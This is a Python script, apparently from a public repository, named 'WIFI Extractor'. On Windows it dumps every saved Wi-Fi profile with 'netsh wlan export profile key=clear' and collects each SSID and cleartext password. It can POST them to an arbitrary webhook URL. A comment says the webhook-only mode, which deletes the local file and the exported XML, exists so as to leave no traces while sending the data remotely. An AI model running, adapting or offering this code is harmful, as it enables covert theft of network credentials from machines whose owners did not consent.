'''Thanks for using wifi extractor|Gracias por usar wifi extractor
    GitHub repository: https://github.com/hrdax/WIFI_Extractor
    '''

import os, requests, subprocess, click
import xml.etree.ElementTree as t

#lista de exportaciones xml que genera el netsh y Wifis
Archivos_XML_WIFI = []
WIFIs = []

@click.command()
@click.option('--url', '-u', default='', help='Webhook/POST URL')
@click.option('--only-webhook', '-o', is_flag=True, help='''Only send data to webhook (whithout creating the txt file) need to specify the url with -u
                                                         Envía los datos solo a la webhook (sin crear el archivo txt) necesitas especificar la url con -u''')
@click.option('--version', '-v', is_flag=True, help='Imprime la version | Prints the version')

#funcion principal
def main(url, only_webhook, version):
    if version == True:
        print('\nWIFI Extractor\n\nVersion 1.0\n')
        exit()
    elif url != '' and only_webhook == True:
        extractor()
        os.remove('Extracciones.txt')
        urlweb(url)
        print('\nDone! \n\nHecho!\n')
    elif url != '' and only_webhook == False:
        extractor()
        urlweb(url)
        print('\nDone! \n\nHecho!\n')
    else:
        extractor()
        print('\nDone! \n\nHecho!\n')

#hara el proceso de extraccion
def extractor():
    #crea el archivo txt
    txt = open("Extracciones.txt", "w")

    #corre el comando en la command prompt
    cmd = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True).stdout.decode()

    #guarda la ruta actual
    ruta = os.getcwd()

    #recorre los archivos en la ruta
    for archivo in os.listdir(ruta):
        #encuentra los archivos xml exportados y los agrega
        if archivo.endswith(".xml"):
            Archivos_XML_WIFI.append(archivo)

    #contador para la lista de wifis
    conta = 0

    #recorre los archivos xml
    for archivo in Archivos_XML_WIFI:
        tr = t.parse(archivo)
        rt = tr.getroot()
        ssid = rt[1][0][1].text
        contrasena = rt[4][0][1][2].text
        ssid_contrasena = f"Nombre/SSID: {ssid} || CONTRASENA/PASSWORD: {contrasena}"
        WIFIs.append(ssid_contrasena)
        txt.write(WIFIs[conta]+"\n")
        conta = conta + 1
        os.remove(archivo)

    #ciera el archivo txt
    txt.close()

#envia a la url de webhook si se especifica con la opcion -u
def urlweb(url):

    #guarda la url de webhook en caso de no querer dejar rastros de archivos y usar webhook para enviar los datos remotamente a nuestro dispositivo
    urlpost = url
    try:
        #envia los datos a la url de webhook
        for i in WIFIs:
            requests.post(urlpost, data=i)
    except:
        print('Error: url not specified or invalid url | url no especificada o es invalida')

if __name__ == '__main__':
    main()